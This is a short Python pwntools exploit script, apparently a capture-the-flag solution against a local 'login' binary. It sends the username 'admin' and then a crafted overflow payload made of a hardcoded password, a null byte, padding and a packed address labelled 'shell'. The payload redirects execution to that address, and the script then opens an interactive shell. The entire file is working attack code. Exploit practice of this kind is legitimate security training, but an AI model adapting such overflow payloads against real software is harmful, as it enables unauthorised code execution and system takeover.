from pwn import *

io=process('./login')
shell=0x0400E88
context.terminal = ['gnome-terminal','-x','sh','-c']

io.recvuntil("username:")
io.sendline('admin')
io.recvuntil('password:')
pl=('2jctf_pa5sw0rd'+p8(0)).ljust(40,'a')+p8(0)+'b'*31+p64(shell)
print(pl)


def debug(addr = '0x004009E2'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

#debug()

io.sendline(pl)

io.interactive()